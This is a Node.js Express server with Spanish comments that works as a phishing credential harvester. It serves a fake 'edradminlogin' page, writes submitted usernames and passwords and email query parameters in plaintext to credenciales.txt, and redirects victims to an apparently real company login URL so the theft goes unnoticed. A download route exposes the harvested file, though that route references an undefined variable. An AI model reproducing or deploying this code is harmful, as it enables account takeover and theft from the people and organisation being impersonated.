const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = process.env.PORT || 3000; // Usa el puerto 3000 por defecto
const tempPath = path.join("./", "credenciales.txt");

// Middleware para leer formularios
app.use(bodyParser.urlencoded({ extended: true }));

// Servir archivos estáticos (como CSS o imágenes)
app.use(
  "/edradminlogin_files",
  express.static(path.join(__dirname, "edradminlogin_files"))
);

app.get("/auth", (req, res) => {
  const email = req.query.email;
  const open = req.query.open;
  if (email && email !== "") {
    // Guardar credenciales en archivo
    const credenciales = `Email: ${email} | Mail \n`;
    // Aquí podrías guardarlo si quieres
    fs.appendFileSync(tempPath, credenciales);
  }
  if (open && open !== "") {
    // Guardar credenciales en archivo
    const credencialesOpen = `EmailOpen: ${open} | Mail \n`;
    // Aquí podrías guardarlo si quieres
    fs.appendFileSync(tempPath, credencialesOpen);
  }

  const filePath = path.join(__dirname, "edradminlogin.html");
  res.sendFile(filePath);
});

// Ruta para descargar el archivo credenciales.txt
app.get("/descargar", (req, res) => {
  if (!fs.existsSync(tempPath)) {
    return res.status(404).send("Archivo no encontrado.");
  }

  res.download(filePath, "credenciales.txt", (err) => {
    if (err) {
      console.error("Error al descargar el archivo:", err);
      res.status(500).send("Error al descargar el archivo");
    }
  });
});

// Ruta para procesar el formulario
app.post("/login", (req, res) => {
  const { usuario, clave } = req.body;

  // Guardar credenciales en archivo
  const credenciales = `Usuario: ${usuario} | Clave: ${clave}\n`;
  fs.appendFileSync(tempPath, credenciales);

  // Redirigir a otra web
  res.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
});

// Iniciar el servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
